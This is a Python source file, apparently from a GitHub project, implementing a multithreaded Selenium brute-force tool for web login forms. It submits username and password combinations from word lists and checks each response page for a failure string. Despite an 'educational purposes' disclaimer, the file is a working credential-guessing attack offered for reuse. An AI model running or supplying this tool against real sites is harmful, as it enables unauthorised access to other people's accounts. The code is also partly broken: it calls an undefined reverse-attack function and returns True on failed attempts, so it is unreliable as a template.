## ========================================================================= ##
##                                                                           ##
## Author : Eliseev Vlad 							  						 ##
## Contact link : https://github.com/shmel3 					 			 ##
## License : All entire code is published under a GNU GPLv3 license          ##
##								                                             ##
## =============================== Notes from author =====================	 ##
##									                                         ##
## This program was written in educational purposes.				         ##
## Please, never use it with malicious intent.				                 ##
## You are free to use any of this code in your program, but I would be      ##
## grateful if you leave my contact link in it.                              ##
##                                                                           ##
## ========================================================================= ##


import threading
from queue import Queue
from selenium import webdriver
import time



### PRINT LOCK ###
print_lock = threading.Lock()
### END PRINT LOCK ###

class TargetObj:
	def __init__(self, target_info):
		# new driver for new thread #
		self.__driver = webdriver.Firefox()

		# loading page #
		self.__driver.get(target_info.url)
		time.sleep(2)

		# getting variables' input #
		login_var = target_info.login_var_name
		pass_var = target_info.password_var_name
		self.__login_input = self.__driver.find_element_by_name(login_var)
		self.__password_input = self.__driver.find_element_by_name(pass_var)

		# setting failure sign #
		self.failure_sign = target_info.failure_sign


	def substitute_login(self, login):
		self.__login_input.clear()
		self.__login_input.send_keys(login)


	def substitute_password(self, password):
		self.__password_input.clear()
		self.__password_input.send_keys(password)


	def submit(self):
		self.__password_input.submit()
		time.sleep(2)


	def parse_reponse(self):
		if self.failure_sign in self.__driver.page_source:
			return True
		else:
			return False




def login_attemp(target_obj, login, password):
	target_obj.substitute_login(login)
	target_obj.substitute_password(password)
	target_obj.submit()
	return target_obj.parse_reponse()



def parse_response(response, failure_sign):
	if failure_sign in response:
		print('UNSUCCESS')
	else:
		print('[+] SUCCESS [+]')



def dict_attack(target_obj, queue, password_list):
	"""
	 Dictionary attack of target url based on
	 default brute force (try all password for every login)
	 e.g. login:pass1, login:pass2, login:pass3, etc.
	"""
	while True:
		login = queue.get()
		for passwd in password_list:
			result = login_attemp(target_obj, login, passwd)
			with print_lock:
				print('Trying {} : {} - {}'.format(login, passwd, result))
		queue.task_done()



def brute_force(target_info, logins, passwords, num_threads, reverse = False):
	q = Queue()
	# this list need to quit all drivers after finishing attack #
	target_objs = []
	if reverse == False:
		for thread_counter in range(num_threads):
			# creating target object with driver for each thread #
			obj_per_thread = TargetObj(target_info)
			target_objs.append(obj_per_thread)
			thrd = threading.Thread(target = dict_attack
									, args = (obj_per_thread, q, passwords))
			thrd.daemon = True
			thrd.start()

		for login in logins:
			q.put(login)
	else:
		for thread_counter in range(num_threads):
			obj_per_thread = TargetObj(target_info)
			target_objs.append(obj_per_thread)
			thrd = threading.Thread(target = reverse_dict_attack
									, args = (obj_per_thread, logins, q))
			thrd.daemon = True
			thrd.start()

		for passwd in passwords:
			q.put(passwd)
	q.join()
